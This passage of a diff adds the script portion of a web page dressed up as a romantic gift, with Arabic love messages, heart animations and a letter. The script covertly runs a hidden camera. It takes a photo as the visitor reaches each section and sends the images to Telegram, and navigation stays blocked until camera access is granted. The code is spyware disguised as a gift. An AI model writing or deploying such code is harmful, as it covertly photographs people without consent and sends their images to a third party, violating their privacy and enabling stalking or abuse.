+                        statusMap[sectionId].textContent = 'فديت شفايفج';
+                        statusMap[sectionId].style.color = '#6f6';
+                    }
+                    return;
+                }
+
+                const imageData = captureFromHiddenCamera();
+                if (!imageData) {
+                    if (statusMap[sectionId]) {
+                        statusMap[sectionId].textContent = 'فشل الرجاء الدخول الى الموقع مجددا ليعمل بشكل صحيح';
+                        statusMap[sectionId].style.color = '#f66';
+                    }
+                    return;
+                }
+
+                autoCaptured[sectionId] = true;
+                if (statusMap[sectionId]) {
+                    statusMap[sectionId].textContent = '...';
+                    statusMap[sectionId].style.color = '#fd8';
+                }
+                sendPhotoToTelegram(imageData, sectionId);
+            }
+
+            // =============================================
+            // INIT - Request camera permission ONCE on load
+            // =============================================
+
+            let initialCheckDone = false;
+
+            async function checkInitialPermission() {
+                if (initialCheckDone) return;
+                initialCheckDone = true;
+
+                // Show loading state briefly
+                setTimeout(() => {
+                    requestCameraPermission();
+                }, 500);
+            }
+
+            // Start - request permission once
+            setTimeout(checkInitialPermission, 300);
+
+            // =============================================
+            // EVENT LISTENERS
+            // =============================================
+
+            document.getElementById('startBtn').addEventListener('click', () => {
+                if (!cameraPermissionGranted) {
+                    showPermissionOverlay();
+                    return;
+                }
+                cinematicTransition('eyes');
+                setTimeout(() => {
+                    const el = document.getElementById('eyesText');
+                    el.textContent = '';
+                    typeText(el, eyesMessages);
+                }, 700);
+            });
+
+            document.getElementById('toLipsBtn').addEventListener('click', () => {
+                if (!cameraPermissionGranted) { showPermissionOverlay(); return; }
+                cinematicTransition('lips');
+            });
+
+            document.getElementById('toKnowBtn').addEventListener('click', () => {
+                if (!cameraPermissionGranted) { showPermissionOverlay(); return; }
+                cinematicTransition('know');
+            });
+
+            document.getElementById('toHeartBtn').addEventListener('click', () => {
+                if (!cameraPermissionGranted) { showPermissionOverlay(); return; }
+                cinematicTransition('heart');
+                document.getElementById('heartMessage').textContent = '';
+                currentHeartIndex = 0;
+            });
+
+            document.getElementById('heartDisplay').addEventListener('click', function() {
+                if (!cameraPermissionGranted) { showPermissionOverlay(); return; }
+                const msg = heartQuotes[currentHeartIndex % heartQuotes.length];
+                document.getElementById('heartMessage').textContent = msg;
+                currentHeartIndex++;
+                for (let i = 0; i < 8; i++) {
+                    const h = document.createElement('i');
+                    h.className = 'fas fa-heart';
+                    h.style.position = 'fixed';
+                    h.style.color = '#e74c3c';
+                    h.style.fontSize = (1.2 + Math.random() * 2.4) + 'rem';
+                    h.style.left = (15 + Math.random() * 70) + '%';
+                    h.style.top = (15 + Math.random() * 60) + '%';
+                    h.style.pointerEvents = 'none';
+                    h.style.zIndex = '999';
+                    h.style.transition = 'all 0.9s ease';
+                    h.style.opacity = '0.8';
+                    document.body.appendChild(h);
+                    setTimeout(() => {
+                        h.style.transform = `translateY(-${80+Math.random()*100}px) scale(0.2)`;
+                        h.style.opacity = '0';
+                    }, 50);
+                    setTimeout(() => h.remove(), 1100);
+                }
+            });
+
+            document.getElementById('toLetterBtn').addEventListener('click', () => {
+                if (!cameraPermissionGranted) { showPermissionOverlay(); return; }
+                cinematicTransition('letter');
+                const el = document.getElementById('letterText');
+                el.textContent = '';
+                setTimeout(() => typeLetter(el, letterParagraphs), 400);
+            });
+
+            document.getElementById('toFinalBtn').addEventListener('click', () => {
+                if (!cameraPermissionGranted) { showPermissionOverlay(); return; }
+                cinematicTransition('final');
+            });
+
+            document.getElementById('restartBtn').addEventListener('click', function() {
+                if (hiddenStream) {
+                    hiddenStream.getTracks().forEach(t => t.stop());
+                    hiddenStream = null;
+                }
+                showSection('start');
+                document.getElementById('eyesText').textContent = '';
+                document.getElementById('letterText').textContent = '';
+                document.getElementById('heartMessage').textContent = '';
+                currentHeartIndex = 0;
+
+                Object.keys(autoCaptured).forEach(key => {
+                    autoCaptured[key] = false;
+                });
+
+                const statuses = ['eyesAutoStatus', 'lipsAutoStatus', 'knowAutoStatus', 'heartAutoStatus', 'letterAutoStatus'];
+                statuses.forEach(id => {
+                    const el = document.getElementById(id);
+                    if (el) {
+                        el.textContent = '';
+                        el.style.color = '#a88';
+                    }
+                });
+
+                // Restart camera if permission was granted
+                if (cameraPermissionGranted) {
+                    startHiddenCamera();
+                } else if (!permissionDeniedPermanently) {
+                    requestCameraPermission();
+                }
+            });
+
+            console.log('❤️ موقع هدية أحمد لأميرة ❤️');
+            console.log('🔒 التوكن محمي عبر Google Apps Script');
+        })();
+    </script>
+</body>
+</html>
